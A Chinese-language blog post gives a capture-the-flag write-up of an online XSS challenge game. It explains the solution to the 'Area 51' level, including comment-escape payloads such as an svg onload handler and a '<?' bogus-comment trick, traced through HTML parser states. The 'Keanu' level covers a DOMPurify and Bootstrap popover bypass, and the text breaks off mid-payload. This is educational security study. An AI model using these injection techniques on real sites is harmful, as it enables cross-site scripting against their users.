<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。
"><title>XSS GAME</title><link rel=canonical href=https://blog.zeddyu.info/2020/02/11/xssgame/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="XSS GAME"><meta property="og:description" content="过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。
"><meta property="og:url" content="https://blog.zeddyu.info/2020/02/11/xssgame/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="XSS"><meta property="article:published_time" content="2020-02-11T14:47:32+00:00"><meta property="article:modified_time" content="2020-02-11T14:47:32+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="XSS GAME"><meta name=twitter:description content="过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2020/02/11/xssgame/>XSS GAME</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Feb 11, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><p>过年期间玩了一下国外的一个 XSS GAME，收获颇丰，记录一下学习过程。本人对于 JavaScript 以及前端的理解不深，水平也不高，如果文章有疏漏之处，还请师傅们斧正。</p><h2 id=introduction>Introduction</h2><p>所有题目的目标都是实现<code>alert(1337)</code>即可，有着不同的难度</p><h2 id=area-51>Area 51</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Challenge --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;pwnme&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>input</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;debug&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=s1>&#39;&#39;</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/[\!\-\/\#\&amp;\;\%]/g</span><span class=p>,</span> <span class=s1>&#39;_&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>template</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;template&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>template</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>input</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>pwnme</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&lt;!-- &lt;p&gt; DEBUG: &#34;</span> <span class=o>+</span> <span class=nx>template</span><span class=p>.</span><span class=nx>outerHTML</span> <span class=o>+</span> <span class=s2>&#34; &lt;/p&gt; --&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>题目源代码如上，题目代码比较简单，首先对用户传入的 debug 参数进行关键字过滤转换，对于<code>!-/#&amp;;%</code>符号都会被下划线替代，然后创建一个 template 标签，标签的 HTML 内容为我们传入的内容，最后在一个 div 中，把构建好的 template 标签输出在一个注释当中。</p><p>所以我们的主要得绕过注释符的限制，由于<code>&lt;!--</code>是多行注释，所以换行的思路我们基本不可行，即使没有把<code>--</code>过滤，JS也会在第一步<code>template.innerHTML</code>将我们的<code>--></code>中的<code>></code>进行转义。所以基本上我们可以“直接“闭合的思路是行不通的。</p><p>首先我们需要知道 HTML 解析顺序，首先先解析 HTML 部分代码，再用 JS 解释器 JS 代码，JS解释器会边解释边执行，对于 innerHTML 会使用 HTML parser 解析其中的代码。本题会利用到一些 HTML parser 的知识，建议配合 W3 文档 <a class=link href=https://www.w3.org/TR/html52/syntax.html target=_blank rel=noopener>The HTML syntax</a>，不想看英文的话也可以凑合凑合看看本菜之前写的 <a class=link href=https://blog.zeddyu.info/2019/03/13/Web%e5%ae%89%e5%85%a8%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b-XSS-I/#Encode target=_blank rel=noopener>关于 HTML 编码</a> 的水文。</p><h3 id=easy-version>Easy Version</h3><p>我们先来看看第一个简单的版本，当时由于出题者比较疏忽，并没有过滤<code>&amp;#;</code>，导致了我们可以用 HTML 实体编码进行绕过，直接闭合注释进而实现 alert ，例如，在没有过滤<code>&amp;#;</code>的情况，我们可以这么做：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>title</span><span class=o>=</span><span class=s>&#34;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;&amp;#x3E;&#34;</span><span class=p>&gt;</span>1
</span></span></code></pre></div><p>使用 HTML 编码将我们的 payload 进行编码绕过</p><pre tabindex=0><code>--&gt;&lt;svg/onload=alert()&gt;
</code></pre><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png loading=lazy></a></figure></p><p>但是这里我们并不能直接传入 HTML 编码绕过，得需要加一个 img 标签利用其属性进行绕过，为什么呢？</p><p>因为这里其实有两次 HTML 解码的操作，第一个是<code>template.innerHTML</code>，第二个是<code>pwnme.innerHTML</code>，第一个解码操作会直接把我们传入的参数进行解码，并且对其中的<code>&lt;></code>进行转义，也就是说，实际上第一个得到的是如下内容：</p><pre tabindex=0><code>--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;
</code></pre><p>在第二步渲染的时候就自然不可能闭合注释了，只能得到如下代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span>
</span></span></code></pre></div><p>所以当我们借助 img 属性进行绕过的时候，第一步得到的实际上是：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>title</span><span class=o>=</span><span class=s>&#34;--&gt;&lt;svg/onload=alert()&gt;&#34;</span><span class=p>&gt;</span>1
</span></span></code></pre></div><p>HTML parser不会将 title 属性内的字符串进行转义，所以第二步当直接输出到页面的时候</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&#34;--&gt;</span><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;alert()&#34;</span><span class=p>&gt;</span>&#34;<span class=ni>&amp;gt;</span>1 <span class=p>&lt;/</span><span class=nt>svg</span><span class=p>&gt;&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span> --<span class=ni>&amp;gt;</span>
</span></span></code></pre></div><p>然后当 HTML parser 解析这段代码时，首先由<code>&lt;!</code>的存在，会进入<a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state target=_blank rel=noopener>Markup declaration open state</a>，中间的代码<code>&lt;p> DEBUG: &lt;template>&lt;img title="</code>会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的<code>--></code>让 HTML parser 进入到了<a class=link href=https://www.w3.org/TR/html52/syntax.html#comment-end-state target=_blank rel=noopener>Comment End State</a>，根据 W3 文档：</p><blockquote><p>Comment end state</p><p>Consume the <a class=link href=https://www.w3.org/TR/html52/syntax.html#next-input-character target=_blank rel=noopener>next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (>)</p><p>Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>. Emit the comment token.</p></li></ul></blockquote><p>接着我们就进入到了 <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>，也就是结束了注释解析状态回到了最开始的 HTML 解析状态，这样就导致我们就成功逃逸了注释符。</p><h3 id=difficult-version>Difficult Version</h3><p>再过滤了实体编码<code>&amp;#;</code>之后我们要怎么绕过呢？我们先给出一个 Trick ，在这里我们可以使用<code>&lt;?</code>进行绕过。</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png loading=lazy></a></figure></p><p>可以看到我们在使用了<code>&lt;?</code>之后成功把 p 标签逃逸了出来，可是为什么呢？我们可以输出第一步的<code>template.innerHTML</code>看看</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png loading=lazy></a></figure></p><p>我们可以发现在第一步渲染的时候，传入的<code>&lt;?</code>已经变成了<code>&lt;!--?--></code>，存在<code>--></code>可以将注释闭合。可是这是为什么呢？</p><p>在<code>template.innerHTML = input </code>的时候，会解析<code>input</code>，然后使用 HTML parser 解析，根据 W3 文档</p><blockquote><p>​ Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>.</p></blockquote><p>解析到<code>&lt;</code>的时候，HTML parser 正处于 <a class=link href=https://www.w3.org/TR/html52/syntax.html#data-state target=_blank rel=noopener>data state</a></p><blockquote><p>Data state</p><p>Consume the <a class=link href=https://www.w3.org/TR/html52/syntax.html#next-input-character target=_blank rel=noopener>next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&)</p><p>Set the <a class=link href=https://www.w3.org/TR/html52/syntax.html#return-state target=_blank rel=noopener>return state</a> to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>. Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state target=_blank rel=noopener>character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state target=_blank rel=noopener>tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a class=link href=https://www.w3.org/TR/html52/syntax.html#parse-errors target=_blank rel=noopener>Parse error</a>. Emit the <a class=link href=https://www.w3.org/TR/html52/syntax.html#current-input-character target=_blank rel=noopener>current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a class=link href=https://www.w3.org/TR/html52/syntax.html#current-input-character target=_blank rel=noopener>current input character</a> as a character token.</p></li></ul></blockquote><p>于是进入 <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state target=_blank rel=noopener>tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a class=link href=https://www.w3.org/TR/html52/syntax.html#next-input-character target=_blank rel=noopener>next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state target=_blank rel=noopener>markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state target=_blank rel=noopener>end tag open state</a>.</p></li><li><p><a class=link href=https://www.w3.org/TR/html52/infrastructure.html#ascii-letters target=_blank rel=noopener>ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a class=link href=https://www.w3.org/TR/html52/syntax.html#reconsume target=_blank rel=noopener>Reconsume</a> in the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state target=_blank rel=noopener>tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a class=link href=https://www.w3.org/TR/html52/syntax.html#parse-errors target=_blank rel=noopener>Parse error</a>. Create a comment token whose data is the empty string. <a class=link href=https://www.w3.org/TR/html52/syntax.html#reconsume target=_blank rel=noopener>Reconsume</a> in the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state target=_blank rel=noopener>bogus comment state</a>.</p></li><li><p>Anything else</p><p><a class=link href=https://www.w3.org/TR/html52/syntax.html#parse-errors target=_blank rel=noopener>Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a class=link href=https://www.w3.org/TR/html52/syntax.html#reconsume target=_blank rel=noopener>Reconsume</a> in the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>.</p></li></ul></blockquote><p>下一个字符是<code>?</code>，根据文档，HTML parser 会创建一个空的 comment token，进入 <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state target=_blank rel=noopener>bogus comment state</a>，</p><blockquote><p>Bogus comment state</p><p>Consume the <a class=link href=https://www.w3.org/TR/html52/syntax.html#next-input-character target=_blank rel=noopener>next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (>)</p><p>Switch to the <a class=link href=https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state target=_blank rel=noopener>data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token’s data.</p></li><li><p>Anything else</p><p>Append the <a class=link href=https://www.w3.org/TR/html52/syntax.html#current-input-character target=_blank rel=noopener>current input character</a> to the comment token’s data.</p></li></ul></blockquote><p>下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的<code>&lt;!--?--></code>，例如输入是<code>aaa&lt;?bbb>ccc</code>的时候，解析到第 i 个字符时，innerHTML 的结果是这样的：</p><pre tabindex=0><code>a
aa
aaa
aaa&lt;
aaa&lt;!--?--&gt;
aaa&lt;!--?b--&gt;
aaa&lt;!--?bb--&gt;
aaa&lt;!--?bbb--&gt;
aaa&lt;!--?bbb--&gt;
aaa&lt;!--?bbb--&gt;c
aaa&lt;!--?bbb--&gt;cc
aaa&lt;!--?bbb--&gt;ccc
</code></pre><p>直到该状态遇到了<code>></code>为止，回到 data state。注意这个 Bogus comment state 解析到<code>></code>的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</p><p>当我们传入<code>&lt;?>&lt;svg onload=alert()></code>时，第一步<code>template.innerHTML</code>我们得到的是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!--?--&gt;</span><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;alert()&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>svg</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>第二步<code>pwnme.innerHTML</code>我们得到的是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><span class=p>&lt;</span><span class=nt>svg</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;alert()&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>svg</span><span class=p>&gt;</span> <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;&lt;/</span><span class=nt>p</span><span class=p>&gt;</span> --<span class=ni>&amp;gt;</span>
</span></span></code></pre></div><p>这时候 HTML parser 解析与我们在 Easy Version 分析差不多，只有遇到<code>--></code>的时候结束 Comment State 相关状态回到 data state，所以我们就成功执行了 XSS。</p><h2 id=keanu>Keanu</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- Challenge --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>number</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;number&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;display:none&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>number</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;alert alert-primary&#34;</span> <span class=na>role</span><span class=o>=</span><span class=s>&#34;alert&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;welcome&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>button</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;keanu&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn btn-primary btn-sm&#34;</span> <span class=na>data-toggle</span><span class=o>=</span><span class=s>&#34;popover&#34;</span> <span class=na>data-content</span><span class=o>=</span><span class=s>&#34;DM @PwnFunction&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>data-trigger</span><span class=o>=</span><span class=s>&#34;hover&#34;</span> <span class=na>onclick</span><span class=o>=</span><span class=s>&#34;alert(`If you solved it, DM me @PwnFunction :)`)&#34;</span><span class=p>&gt;</span>Solved it?<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Input */</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>number</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;number&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=s2>&#34;7&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nx>name</span> <span class=o>=</span> <span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>),</span> <span class=p>{</span> <span class=nx>SAFE_FOR_JQUERY</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;number#number&#39;</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=nx>number</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#welcome&#39;</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=sb>`Welcome &lt;b&gt;</span><span class=si>${</span><span class=nx>name</span> <span class=o>||</span> <span class=s2>&#34;Mr. Wick&#34;</span><span class=si>}</span><span class=sb>!&lt;/b&gt;`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Greet */</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#keanu&#39;</span><span class=p>).</span><span class=nx>popover</span><span class=p>(</span><span class=s1>&#39;show&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>_</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#keanu&#39;</span><span class=p>).</span><span class=nx>popover</span><span class=p>(</span><span class=s1>&#39;hide&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>2000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Check Magic Number */</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>magicNumber</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>()</span> <span class=o>*</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>number</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=nx>$</span><span class=p>(</span><span class=s1>&#39;number#number&#39;</span><span class=p>).</span><span class=nx>html</span><span class=p>());</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>magicNumber</span> <span class=o>===</span> <span class=nx>number</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;You&#39;re Breathtaking!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>本题题目引入了四个 js 文件：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>    <span class=c>&lt;!-- DOMPurify(2.0.7) --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>integrity</span><span class=o>=</span><span class=s>&#34;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=&#34;</span> <span class=na>crossorigin</span><span class=o>=</span><span class=s>&#34;anonymous&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=c>&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://code.jquery.com/jquery-3.4.1.slim.min.js&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>integrity</span><span class=o>=</span><span class=s>&#34;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>crossorigin</span><span class=o>=</span><span class=s>&#34;anonymous&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>integrity</span><span class=o>=</span><span class=s>&#34;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>crossorigin</span><span class=o>=</span><span class=s>&#34;anonymous&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>integrity</span><span class=o>=</span><span class=s>&#34;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>crossorigin</span><span class=o>=</span><span class=s>&#34;anonymous&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>这个题目也比较有意思，额外给我们增加的这几个 js 文件，也就是说这几个文件就是这道题我们可能需要用的工具了。</p><p>Purify.js 是一个 XSS WAF，Popper.js是一个用于构造提示的组件，题目中也给了一个简单的使用 popper 的例子，Jqeury.js 与 Bootstrap 就不多说了。</p><p>首先我们来看我们的可控点，一个是 name 参数，另一个是 number 参数。然而 number 参数我们却只能使用一位，而 name 参数虽然任意长度可控，但是要经过 XSS WAF 过滤。虽然之前有一些利用 mxss bypass Domprify 的事例，但是都是在 2.0 左右的版本，这里的 2.0.7 又是最新的版本，应该不会是什么新的绕过，否则 number 参数与最后的 <code>eval($("number#number").html());</code> 就没用了，并且还有一些其他工具我们没有用上。</p><p>所以我们应该能用到的就是通过最后一个<code>eval($("number#number").html())</code>进行 XSS ，而 number 我们可控的只有一位，我们可能得想一些其他办法添加 number 标签当中的内容。</p><p>我们可以看到 <a class=link href=https://getbootstrap.com/docs/4.0/components/popovers target=_blank rel=noopener>popper document</a> 结合题目给出的那个例子，我们可以发现貌似这个 popper.js 可以满足我们添加新内容条件，而在文档 <a class=link href=https://getbootstrap.com/docs/4.0/components/popovers/#options target=_blank rel=noopener>options</a> 部分，我们可以到有一些我们值得关注的参数：</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string | element | false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: 'body'</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string | element | function</td><td>''</td><td>Default content value if <code>data-content</code> attribute isn&rsquo;t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>我们可以从文档知道，我们可以通过<code>data-container</code>来控制 popover 的位置，<code>data-content</code>来控制内容，于是我们是不是可以有一个想法把这个 popover 弄到 number 标签当中呢？于是我们可以尝试构造如下 payload ：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>button</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;keanu&#34;</span> <span class=na>data-toggle</span><span class=o>=</span><span 